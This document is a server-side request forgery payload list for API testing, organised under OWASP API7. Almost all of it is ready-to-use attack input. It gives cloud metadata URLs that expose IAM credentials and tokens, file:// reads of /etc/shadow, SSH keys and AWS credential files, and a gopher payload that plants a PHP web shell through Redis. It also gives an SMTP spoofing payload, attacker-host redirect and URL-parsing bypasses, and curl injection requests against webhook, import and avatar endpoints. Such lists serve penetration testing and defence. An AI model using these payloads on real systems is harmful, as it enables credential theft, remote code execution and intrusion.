# API SSRF Payloads — Server-Side Request Forgery
# OWASP API Security: API7 — Server Side Request Forgery
# Severity: HIGH to CRITICAL

# ============================================================
# 1. CLOUD METADATA ENDPOINTS
# ============================================================

# AWS IMDSv1
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/dynamic/instance-identity/document

# AWS IMDSv2 (requires token — SSRF still possible if server follows redirects)
# Step 1: PUT http://169.254.169.254/latest/api/token (X-aws-ec2-metadata-token-ttl-seconds: 21600)
# Step 2: GET with token header

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
# Note: GCP requires Metadata-Flavor: Google header

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Note: Azure requires Metadata: true header

# DigitalOcean
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/

# ============================================================
# 2. INTERNAL SERVICE DISCOVERY
# ============================================================

# Localhost services
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:8080
http://127.0.0.1:8443
http://127.0.0.1:3000
http://127.0.0.1:5000
http://127.0.0.1:9090
http://127.0.0.1:9200
http://127.0.0.1:6379
http://127.0.0.1:27017
http://127.0.0.1:11211
http://127.0.0.1:5432
http://127.0.0.1:3306
http://127.0.0.1:4444

# Localhost alternatives
http://localhost:8080
http://0.0.0.0:8080
http://[::1]:8080
http://0177.0.0.1:8080
http://2130706433:8080
http://0x7f000001:8080
http://017700000001:8080
http://127.1:8080
http://127.0.1:8080

# Internal networks
http://10.0.0.1
http://172.16.0.1
http://192.168.1.1
http://192.168.0.1

# Docker / Kubernetes
http://172.17.0.1
http://host.docker.internal
http://kubernetes.default.svc
http://kubernetes.default.svc.cluster.local

# ============================================================
# 3. PROTOCOL SMUGGLING
# ============================================================

# File protocol
file:///etc/passwd
file:///etc/hosts
file:///etc/shadow
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/net/tcp
file:///home/<user>/.ssh/id_rsa
file:///home/<user>/.aws/credentials

# Windows paths
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/Users/Administrator/.aws/credentials

# Gopher (for Redis, MySQL, SMTP exploitation)
gopher://127.0.0.1:6379/_SET%20pwned%20true
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0ACONFIG%20SET%20dbfilename%20shell.php%0ASET%20payload%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0ASAVE
gopher://127.0.0.1:25/_MAIL%20FROM:attacker@evil.com%0ARCPT%20TO:victim@target.com%0ADATA%0ASubject:pwned%0A%0Ayou've%20been%20hacked%0A.

# Dict protocol
dict://127.0.0.1:6379/INFO

# LDAP
ldap://127.0.0.1:389/%0astats%0aquit

# ============================================================
# 4. FILTER BYPASS TECHNIQUES
# ============================================================

# URL encoding
http://%31%32%37%2e%30%2e%30%2e%31
http://127.0.0.1%23@attacker.com
http://attacker.com%2f@127.0.0.1

# Double encoding
http://%2531%2532%2537%252e%2530%252e%2530%252e%2531

# DNS rebinding
# Register a domain that resolves to 127.0.0.1:
# Use services like rebind.it or ssrf.localdomain.pw
http://spoofed.burpcollaborator.net

# Redirect bypass
# Host a redirect at attacker.com that 302s to internal URL
http://attacker.com/redirect?url=http://169.254.169.254/latest/meta-data/

# URL parsing confusion
http://127.0.0.1:80\@attacker.com
http://attacker.com#@127.0.0.1
http://127.0.0.1\tattacker.com
http://127.0.0.1%00attacker.com
http://attacker.com\@127.0.0.1

# Decimal IP
http://2130706433 (= 127.0.0.1)
http://3232235777 (= 192.168.1.1)

# Octal IP
http://0177.0.0.1 (= 127.0.0.1)
http://0300.0250.0.1 (= 192.168.0.1)

# IPv6
http://[::1]
http://[0000::1]
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]

# Short URL / redirect services as bypass
# tinyurl, bit.ly etc pointing to internal addresses

# ============================================================
# 5. COMMON SSRF INJECTION POINTS IN APIs
# ============================================================

# Webhook URL
curl -X POST https://api.target.com/api/v1/webhooks \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/", "events": ["*"]}'

# PDF / report generation
curl -X POST https://api.target.com/api/v1/reports/generate \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"template_url": "http://169.254.169.254/latest/user-data"}'

# Image / file URL fetching
curl -X POST https://api.target.com/api/v1/users/me \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"avatar_url": "http://169.254.169.254/latest/meta-data/"}'

# OAuth callback / redirect_uri
curl -X POST https://api.target.com/api/v1/oauth/authorize \
  -d "client_id=test&redirect_uri=http://169.254.169.254/latest/meta-data/"

# URL preview / link unfurling
curl -X POST https://api.target.com/api/v1/messages \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"content": "Check this: http://169.254.169.254/latest/meta-data/"}'

# Import / data source URL
curl -X POST https://api.target.com/api/v1/import \
  -H "Authorization: Bearer <TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"source_url": "http://127.0.0.1:6379/"}'

# ============================================================
# 6. DETECTION & VERIFICATION
# ============================================================

# Use Burp Collaborator / interact.sh / webhook.site
# to confirm out-of-band interaction
http://YOUR_BURP_COLLABORATOR_URL
http://YOUR_INTERACTSH_URL
https://webhook.site/YOUR_UUID

# Time-based detection (connect to closed port = timeout)
http://127.0.0.1:1 (closed port — if response is slow, SSRF confirmed)
http://192.168.1.1:1 (try internal ranges for timing differences)
